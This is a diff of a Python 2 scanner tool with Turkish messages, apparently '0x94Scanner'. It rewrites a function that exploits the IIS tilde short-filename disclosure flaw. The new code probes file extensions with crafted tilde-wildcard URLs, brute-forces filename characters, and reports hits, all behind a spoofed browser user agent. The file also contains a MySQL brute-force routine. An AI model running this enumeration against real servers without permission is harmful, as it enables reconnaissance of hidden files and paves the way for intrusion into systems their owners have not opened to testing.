@@ -111,33 +111,62 @@ limitlinkler={}
 
 
 
-def iistilde(url):
-    charset = set(list('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_'))
-    print "IIS tilde acigi taraniyor bu islem biraz surebilir lutfen bekleyin"
-    uzanti=["","jpg","gif","asp","php","aspx","htm","html","txt"]
-    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
-    opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0'"),
-        ("Cookie", "0x94Scanner=0x94")]
-    for brutechar in charset:
-	for geluzanti in uzanti:
-	    	try:
-		    print brutechar+"."+geluzanti
-		    urlnormal=url+"/%2F"+brutechar+"*%7E1."+geluzanti+"*%2Fa.aspx?aspxerrorpath=/"
-		    urlac = opener.open(urlnormal)   
-		    response = urlac.code
-		    if response=="404":
-			yaz("IIS tilde acigi var / bulunan veri= "+brutechar+"."+geluzanti,True)
-		except urllib2.HTTPError,  e:
-		    if(e.code==404):
-			yaz("IIS tilde acigi var / bulunan veri= "+brutechar+"."+geluzanti,True)    
-		except urllib2.URLError,  e:
-		    print e.reason
-		    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
-		    #yaz(mesaj)
-		except:
-		    mesaj="Bilinmeyen hata olustu\n"
-		    #yaz(mesaj)       
+def iistildeuzantikontrol(url):
     
+    
+    tamkontrol={"aspx":"%2F1234567890*%7E1*%2Fa.aspx?aspxerrorpath=/",
+                "asp":"%2F1234567890*%7E1*%2Fa.asp?aspxerrorpath=/",
+                "shtml":"%2F1234567890*%7E1*%2Fa.shtml?aspxerrorpath=/",
+                "asmx":"%2F1234567890*%7E1*%2Fa.asmx?aspxerrorpath=/",
+                "ashx":"%2F1234567890*%7E1*%2Fa.ashx?aspxerrorpath=/",
+                "config":"%2F1234567890*%7E1*%2Fa.config?aspxerrorpath=/",
+                "php":"%2F1234567890*%7E1*%2Fa.php?aspxerrorpath=/"
+		}
+    
+    for kontrolkey,kontrolvalue in tamkontrol.items():
+	try:
+	    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
+	    opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0'"),
+	    ("Cookie", "0x94Scanner=0x94")]
+	    urlnormal=url+"/"+kontrolvalue
+	    urlac = opener.open(urlnormal) 
+	    
+	except urllib2.HTTPError,  e:
+	    if(e.code!=404):
+		return kontrolkey 	
+    
+def iistilde(url):
+    
+    keyim=iistildeuzantikontrol(url)
+    
+    if keyim!="":
+    
+	yaz("[#] Bulunan IIS tilde karakter = "+keyim,True)
+	charset = set(list('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_'))
+	print "IIS tilde acigi taraniyor bu islem biraz surebilir lutfen bekleyin"
+	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(),urllib2.HTTPSHandler())    
+	opener.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0'"),
+	    ("Cookie", "0x94Scanner=0x94")]
+	for brutechar in charset:
+		    try:
+			print brutechar
+			urlnormal=url+"/%2F"+brutechar+"*%7E1*%2Fa."+keyim+"?aspxerrorpath=/"
+			urlac = opener.open(urlnormal)   
+			response = urlac.code
+			
+		    except urllib2.HTTPError,  e:
+			if(e.code==404):
+			    yaz("IIS tilde acigi var / bulunan veri= "+brutechar,True) 
+			    break
+			
+		    except urllib2.URLError,  e:
+			print e.reason
+			mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
+			#yaz(mesaj)
+		    except:
+			mesaj="Bilinmeyen hata olustu\n"
+			#yaz(mesaj)       
+	
 
 def mysqlportubrute(ip):
     
